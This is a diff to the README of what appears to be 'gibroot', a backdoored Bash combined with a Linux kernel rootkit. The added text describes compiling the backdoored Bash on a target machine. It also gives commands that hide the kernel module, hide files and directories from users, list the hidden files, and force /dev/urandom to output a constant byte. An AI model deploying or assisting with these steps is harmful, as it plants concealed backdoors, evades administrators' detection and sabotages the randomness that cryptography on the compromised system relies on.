@@ -21,7 +21,7 @@ Make
 step 3: copy over bash-4.3 and bdoor_common.h to the target machine, and compile Bash by running configure --with-bash-malloc=no and make (to have this work with different versions of Bash, go int bash-4.3/builtins, copy over gibroot.def to the other version's builtin folder, and change its Makefile.in to conform with https://stackoverflow.com/questions/10063417/how-do-i-add-an-internal-command-to-bash)
 ```
 cd bash-4.3
-./configure
+./configure --with-bash-malloc=no
 make
 ```
 
@@ -66,9 +66,27 @@ to hide the kernel module from userspace, use
 gibroot hmod
 ```
 
-to restore the kernel module's visibility, use 
+to restore the kernel module's visibility, use
 ```
 gibroot smod
 ```
-UNDER CONSTRUCTION
 
+to hide a file(s) or directory(s), use
+```
+gibroot hide [file(s)]
+```
+
+to unhide files, use
+```
+gibroot show [file(s)]
+```
+
+to look at what files are being hidden, use
+```
+cat /proc/hidden_files
+```
+
+to compromise /dev/urandom so it always writes 0x20, use
+```
+gibroot urand
+```
